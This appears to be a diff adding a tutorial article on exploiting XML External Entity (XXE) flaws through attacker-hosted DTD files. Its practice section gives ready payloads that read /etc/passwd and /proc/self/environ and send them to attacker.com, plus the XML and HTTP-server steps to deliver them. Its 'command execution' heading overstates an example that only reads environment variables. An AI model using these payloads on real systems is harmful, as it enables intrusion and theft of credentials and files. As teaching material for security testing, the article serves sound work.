@@ -1,0 +1,99 @@
+---
+title: Exploiting XXE Vulnerabilities with DTD Files
+description: Learn how XXE vulnerabilities can be exploited using attacker-controlled
+  DTD files for data exfiltration or command execution.
+keywords:
+- XXE
+- DTD
+- XML
+- data exfiltration
+- command execution
+- vulnerabilities
+- external entities
+- cybersecurity
+---
+
+# XXE Inside DTD File
+
+## Context
+
+The intent of this article is to demonstrate how XML External Entity (XXE) vulnerabilities can be exploited using attacker-controlled external Document Type Definition (DTD) files. This technique can lead to data exfiltration or even command execution in certain cases, depending on the server's configuration and the parser's capabilities. It assumes the reader is familiar with XML structure, DTD basics, entity declarations, and XML External Entity vulnerabilities.
+
+## Theory
+
+### Role of External DTDs in XXE Attacks
+
+External DTDs are often used in XML structure to define entities that are outside the main XML document. The vulnerability arises when XML parsers are configured to fetch and process these external DTDs. Attackers can exploit this by supplying a malicious DTD file that the parser fetches, enabling the attacker to execute advanced XXE payloads. The typical attack sequence involves an attacker hosting a DTD, which a vulnerable parser fetches and processes, thereby executing the attacker's logic.
+
+### DTD File Structure for XXE
+
+A DTD file can declare parameter entities, general entities, and entity expansion chains. Parameter entities within these DTDs can reference files or URLs and can trigger further expansions. This capability allows the construction of complex payloads that can access local resources or external services.
+
+### Standalone DTD Exfiltration Techniques
+
+A common technique involves defining entities within a DTD to read sensitive files and exfiltrate the contents via out-of-band channels, such as HTTP. This exfiltration method relies on the parser's ability to resolve external entities and make outbound connections, opening a pathway for data theft.
+
+### Attacker-Controlled DTD Hosting and MITM
+
+For an attacker to execute a successful XXE attack using DTDs, they must control the location of the DTD file. This could be achieved by hosting the file on a web server or positioning themselves as a man-in-the-middle (MITM). When the victim's XML references this attacker-controlled DTD, the parser will fetch and execute the embedded XXE logic.
+
+## Practice
+
+### Exfiltrating Sensitive Files via External DTD
+
+- **Step 1**: Host a malicious DTD file on a server you control.
+  - This involves preparing a DTD to define your XXE payload.
+
+- **Step 2**: Start a simple HTTP server to serve the DTD.
+  ```bash
+  python3 -m http.server 8000 --bind 0.0.0.0
+  ```
+
+- **Step 3**: Create a DTD payload to read `/etc/passwd` and exfiltrate it via HTTP.
+  ```xml
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com:8000/?data=%file;'>">
+  %eval;
+  ```
+
+- **Step 4**: Craft an XML document that references the external DTD.
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE data SYSTEM "http://attacker.com:8000/malicious.dtd">
+  <data>&exfil;</data>
+  ```
+
+- **Step 5**: Submit the crafted XML to the vulnerable application.
+  - This could be done through various input methods like uploads, API endpoints, or direct POST requests.
+
+- **Expected Outcome**: The HTTP server should receive GET requests with the contents of `/etc/passwd` appended to the URL, indicating successful data exfiltration.
+
+### Command Execution via External DTD (if supported)
+
+- **Step 1**: Modify the DTD to potentially execute commands using protocol handlers (parsing capabilities dependent).
+  - If supported, this can include executing files or using dangerous protocol handlers.
+
+- **Step 2**: Example DTD for environmental variable exfiltration (adapt for command output where applicable).
+  ```xml
+  <!ENTITY % cmd SYSTEM "file:///proc/self/environ">
+  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com:8000/?env=%cmd;'>">
+  %eval;
+  ```
+
+- **Step 3**: Craft corresponding XML referencing the external DTD.
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE data SYSTEM "http://attacker.com:8000/malicious.dtd">
+  <data>&exfil;</data>
+  ```
+
+- **Step 4**: Submit the XML to the vulnerable endpoint and observe the retrieval of command output or environment variables.
+
+- **Expected Outcome**: If successful, output or environment data may appear in server logs, signifying possible command execution or environment access.
+
+## Tools
+
+- **python3**
+- **Burp Suite**
+- **nc**
+- **custom HTTP server**
